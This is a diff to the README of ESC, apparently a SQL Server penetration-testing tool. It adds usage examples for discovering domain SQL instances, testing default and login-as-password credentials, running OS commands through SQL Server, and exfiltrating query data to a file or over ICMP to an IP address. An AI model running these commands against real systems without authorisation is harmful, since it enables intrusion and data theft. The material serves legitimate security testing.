@@ -185,9 +185,10 @@ Below are some quick instructions for running ESC functions through PowerShell.
      exit
  </pre>
  
- ### Recommended Command Sequence <a name="recommendcommands"></a>
- Below is a recommended command sequence for those of you who want to quickly discover SQL Server instances and determine which ones you have immediate access to.
+ ### Common Commands <a name="recommendcommands"></a>
+Below are some common command examples to get you started.
 
+ <strong>Targeting All Domain Instances</strong><br>
  `discover domainspn`
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Discovery-DomainSPN.png)<br>
  
@@ -207,22 +208,40 @@ Below are some quick instructions for running ESC functions through PowerShell.
  `show access`
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess.png)<br>
  
+ <strong>Testing for Common Password Issues</strong><br>
+
  `check defaultpw`
+  [Related Reading](https://blog.netspi.com/attacking-application-specific-sql-server-instances/)
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-CheckDefaultPw.png)<br>
  
  `check loginaspw`
+ [Related Reading[(https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw1.png)<br>
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/LoginAsPw2.png)<br>
  
+  <strong>Running OS Commands</strong><br>
  `run oscmd whoami`
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/RunOsCmd1.png)<br>
  
- `show access`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/Access-ShowAccess2.png)<br>
- 
+ <strong>Saving List of Accessible Servers</strong><br>
+ The command below can be used to export a list of servers that you can log into.
  `export access c:\temp\access.csv`
- ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
+  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport1.png)<br>
  ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/AccessExport2.png)<br>
+ 
+ <strong>Data Exfiltration Example: Local File</strong><br>
+ Below is an example of how to exfiltrate data to a local file.
+ 
+ `set file enabled`
+ `set filepath c:\temp\output.csv`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil1.png)<br>
+ 
+ `select @@version`
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil2.png)<br>
+ ![examplescenario](https://github.com/NetSPI/ESC/blob/master/screenshots/FileExfil3.png)<br>
+ 
+ <strong>Data Exfiltration Example: ICMP</strong><br>
+ Below is an example of how to exfiltrate data over ICMP with ESC.
  
  `set icmp enabled` <br>
  `set icmpip 192.168.1.1`
